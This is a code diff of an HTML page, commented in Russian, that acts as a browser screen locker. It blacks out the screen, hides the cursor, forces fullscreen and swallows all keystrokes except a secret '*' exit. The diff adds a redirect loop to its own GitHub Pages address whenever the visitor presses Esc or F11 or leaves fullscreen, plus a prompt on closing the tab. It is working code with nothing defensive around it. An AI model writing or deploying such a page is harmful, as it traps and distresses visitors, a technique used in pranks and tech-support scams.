@@ -1,5 +1,5 @@
 <!DOCTYPE html>
-<html>
+<html lang="en">
 <head>
     <meta charset="UTF-8">
     <title> </title>
@@ -8,23 +8,18 @@
             margin: 0; padding: 0; width: 100%; height: 100%; 
             background: #000; overflow: hidden; cursor: none; 
         }
-        /* Невидимый слой-ловушка поверх всего */
-        #trap {
-            position: fixed; top: 0; left: 0; width: 100%; height: 100%;
-            z-index: 999999; cursor: none;
-        }
     </style>
 </head>
-<body>
-
-<div id="trap"></div>
+<body onclick="engage()">
 
 <script>
-    const trap = document.getElementById('trap');
-    let isActive = true;
+    // --- НАСТРОЙКИ ---
+    // Замени "USER_ID" на свой ник в GitHub, а "REPO_NAME" на название репозитория
+    const BASE_URL = "https://TheRealJumpity.github.io/2/"; 
+    let active = true;
 
-    async function forceFS() {
-        if (!isActive) return;
+    async function engage() {
+        if (!active) return;
         try {
             const doc = document.documentElement;
             if (doc.requestFullscreen) await doc.requestFullscreen();
@@ -32,41 +27,49 @@
         } catch (e) {}
     }
 
-    // Любой клик или попытка взаимодействия возвращает Fullscreen
-    window.addEventListener('click', forceFS);
-    window.addEventListener('mousedown', forceFS);
+    // Функция циклического редиректа на самого себя
+    function triggerLoop() {
+        if (!active) return;
+        // Если мы уже на #loop, убираем его, если нет — добавляем
+        const newUrl = window.location.hash === "#loop" ? BASE_URL : BASE_URL + "#loop";
+        window.location.replace(newUrl);
+    }
 
-    // Блокировка ВСЕХ клавиш
+    // Блокировка клавиш
     window.addEventListener('keydown', (e) => {
+        // СЕКРЕТНЫЙ ВЫХОД
         if (e.key === "*") {
-            isActive = false;
+            active = false;
             document.body.style.cursor = "default";
-            trap.style.display = "none";
             if (document.exitFullscreen) document.exitFullscreen();
             return;
         }
 
-        if (isActive) {
+        if (active) {
             e.preventDefault();
             e.stopPropagation();
-            // Любая клавиша (кроме *) провоцирует возврат в FS
-            forceFS();
+            // Любая клавиша (Esc, F11 и т.д.) вызывает редирект
+            triggerLoop();
         }
     }, true);
 
-    // Если вышел через Esc — ждем любого шороха, чтобы вернуть назад
+    // Если пользователь вышел из Fullscreen (Esc/F11) — мгновенный редирект
     document.addEventListener('fullscreenchange', () => {
-        if (isActive && !document.fullscreenElement) {
-            // Без алертов мы просто ждем следующего клика/нажатия клавиши
-            // но визуально экран остается черным и "мертвым"
+        if (active && !document.fullscreenElement) {
+            triggerLoop();
         }
     });
 
-    // Запрет контекстного меню
-    window.oncontextmenu = (e) => { if (isActive) e.preventDefault(); };
+    // Попытка закрыть вкладку
+    window.onbeforeunload = () => active ? "" : null;
 
-    // Системное окно при попытке закрыть вкладку
-    window.onbeforeunload = () => isActive ? "" : null;
+    // Автоматическая попытка входа при загрузке (если был редирект)
+    window.onload = () => {
+        if (window.location.hash === "#loop" && active) {
+            // Браузер может блокировать авто-FS, поэтому ждем любого клика/движения
+            document.addEventListener('mousemove', engage, { once: true });
+        }
+    };
 
 </script>
 </body>
